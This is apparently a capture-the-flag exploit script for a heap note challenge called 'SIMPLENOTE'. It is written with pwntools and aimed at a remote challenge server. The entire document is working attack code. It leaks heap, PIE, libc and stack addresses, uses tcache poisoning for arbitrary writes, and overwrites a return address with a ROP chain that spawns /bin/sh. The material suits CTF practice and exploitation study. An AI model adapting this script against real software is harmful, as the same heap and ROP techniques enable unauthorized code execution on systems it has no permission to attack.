## SIMPLENOTE

```
#!/usr/bin/env python3

from pwn import *

# --- Configuration ---
exe = ELF("./chall_patched") # Load the patched executable
libc = exe.libc             # Load the libc associated with the executable
context.binary = exe        # Set the context binary for pwntools
context.terminal = ['tmux', 'splitw', '-h'] # GDB terminal setup for tmux

gs = '''
c
'''

# --- Remote/Local Connection ---
# io = process(exe.path) # Uncomment for local debugging
io = remote("pwn.blitzhack.xyz", 4566) # Connect to the remote challenge server

# --- Helper Functions for Interacting with the Challenge ---

def calloc(size, data):
    # Allocates a chunk of memory using calloc.
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'note: ', str(size).encode())
    io.sendlineafter(b'data: ', data)

def free(index):
    # Frees a chunk of memory at a given index, handling the guess.
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b') ', str(index).encode())
    io.sendlineafter(b'guess: ', b'0') # Send initial wrong guess
    io.recvuntil(b'wrong guess ')
    right_guess = io.recvline().strip() # Get the correct guess
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b') ', str(index).encode())
    io.sendlineafter(b'guess: ', right_guess) # Send the correct guess to proceed

def puts(index):
    # Prints the data of a chunk at a given index, handling the guess.
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'): ', str(index).encode())
    io.sendlineafter(b'guess: ', b'0') # Send initial wrong guess
    io.recvuntil(b'wrong guess: ')
    right_guess = io.recvline().strip() # Get the correct guess
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'): ', str(index).encode())
    io.sendlineafter(b'guess: ', right_guess) # Send the correct guess to proceed

def edit(index, data):
    # Edits the data of a chunk at a given index, handling the guess.
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b') ', str(index).encode())
    io.sendlineafter(b'guess: ', b'0') # Send initial wrong guess
    io.recvuntil(b'wrong guess ')
    right_guess = io.recvline().strip() # Get the correct guess
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b') ', str(index).encode())
    io.sendlineafter(b'guess: ', right_guess) # Send the correct guess to proceed
    io.sendafter(b'data: ', data) # Send the new data

def get_pie_leak():
    # Triggers a PIE leak from menu option 9999.
    io.sendlineafter(b'> ', b'9999')
    io.sendlineafter(b'name: \n', b'.')
    io.sendlineafter(b'age: \n', b'+')
    io.recvuntil(b'age: ')
    return int(io.recvuntil(b' ')[:-1]) # Extract the leaked integer

# --- GDB Attachment (Uncomment to use) ---
# gdb.attach(io, gdbscript=gs)

# --- Exploit Steps ---

# 1. Heap Leak
calloc(0x20 - 8, b'A') # Allocate chunk 0 (size 0x20)
free(0) # Free chunk 0 to put it in tcache
puts(0) # Print freed chunk to leak heap address (tcache fd points to itself)
io.recvuntil(b'data: "')
heap_base = u64(io.recvuntil(b'"')[:-1].ljust(8, b'\x00')) << 12 # Extract and align heap base
print(f'{hex(heap_base) = }')

# 2. PIE Leak
pie_leak = get_pie_leak() # Get PIE leak from the special menu option
print(f'{hex(pie_leak) = }')

# 3. Tcache Poisoning - Setting up for Arbitrary Write
# Free chunk 0 multiple times to fill tcache and prepare for poisoning
for _ in range(2, 7 + 1): # Loop 6 times (total 7 frees of chunk 0)
    # Overwrite fd of chunk 0 with an encoded target address (PIE - 0x20)
    edit(0, p64((heap_base >> 12) ^ (pie_leak - 0x20)))
    free(0) # Free again, pushing the fake chunk into tcache

# 4. Libc Leak
calloc(0x20 - 8, b'ASDF') # Index 1: Allocate the first chunk from poisoned tcache (original chunk 0 location)
calloc(0x20, b'BADS')     # Index 2: Allocate the second chunk, which lands at (pie_leak - 0x20)

free(2) # Free chunk 2 (at pie_leak - 0x20)
free(1) # Free chunk 1 (at original heap location)

# Overwrite fd of chunk 1 to point to pie_leak + 0x60 (a GOT entry for libc leak)
edit(1, p64((heap_base >> 12) ^ (pie_leak + 0x60)))

calloc(0x20 - 8, b'ASDF') # Index 3: Allocate from original heap location
# Index 4: Allocate at pie_leak + 0x60. Write pie_leak - 0x40 (for stack leak) and dummy data.
calloc(0x20 - 8, p64(pie_leak - 0x40) + p64(0xcafebabe))

puts(2) # Print chunk 2 (which is at pie_leak + 0x60) to leak libc address
io.recvuntil(b'data: "')
libc_leak = u64(io.recvuntil(b'"')[:-1].ljust(8, b'\x00'))
libc.address = libc_leak - 0x2045c0 # Calculate libc base address
print(f'{hex(libc_leak) = }')
print(f'{hex(libc.address) = }')

# 5. Stack Leak
edit(4, p64(libc.sym.environ)) # Overwrite chunk 4 to point to libc's environ variable
puts(2) # Print chunk 2 to leak stack address from environ
io.recvuntil(b'data: "')
stack_leak = u64(io.recvuntil(b'"')[:-1].ljust(8, b'\x00'))
ret_addr = stack_leak - 0x170 # Calculate the return address on the stack
print(f'{hex(stack_leak) = }')
print(f'{hex(ret_addr) = }')

# 6. Overwrite Return Address with ROP Chain
edit(4, p64(ret_addr)) # Overwrite chunk 4 to point to the return address on the stack

rop = ROP(libc) # Initialize ROP chain for libc
rop.raw(rop.find_gadget(['ret']).address) # Add 'ret' gadget for stack alignment
rop.system(next(libc.search(b'/bin/sh\x00'))) # Call system with '/bin/sh' as argument

edit(2, rop.chain()) # Overwrite chunk 2 (which now points to ret_addr) with the ROP chain

# --- Interactive Shell ---
io.interactive() # Drop into an interactive shell to interact with the spawned shell


```